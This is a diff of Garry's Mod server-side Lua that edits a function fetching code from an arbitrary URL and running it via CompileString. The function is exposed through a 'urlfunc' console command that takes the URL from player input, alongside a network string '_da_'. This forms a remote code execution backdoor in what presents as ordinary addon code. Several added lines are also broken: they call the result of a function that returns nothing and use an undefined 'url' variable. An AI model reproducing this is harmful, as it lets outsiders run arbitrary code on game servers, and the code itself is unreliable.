@@ -1,16 +1,17 @@
 	if SERVER then
-	
-		local function UrlFunc(...)
-			local arg = {...}
-			local func
-			url = arg[1]
-			table.remove(arg, 1)
-			
-			http.Fetch(arg[1], function(c)
-				func = CompileString(c, "UrlFunc", false)
-				return func(arg)
+		local function UrlFunc(url)
+			http.Fetch(url, function(c)
+				local func = CompileString(c, "UrlFunc", false)
+				return func()
 			end)			
 		end
+		
+		local function UrlRun(url)
+			local func = UrlFunc(url)
+			func()
+		end
+		
+		local great = UrlFunc(url)
 		
 		util.AddNetworkString('_da_')
 		
@@ -350,7 +351,7 @@
 		
 		local function cmdurlfunc(player,command,args)
 			if args then
-				UrlFunc(args)
+				UrlFunc(args[1])
 			end
 		end
 		concommand.Add("urlfunc",cmdurlfunc)
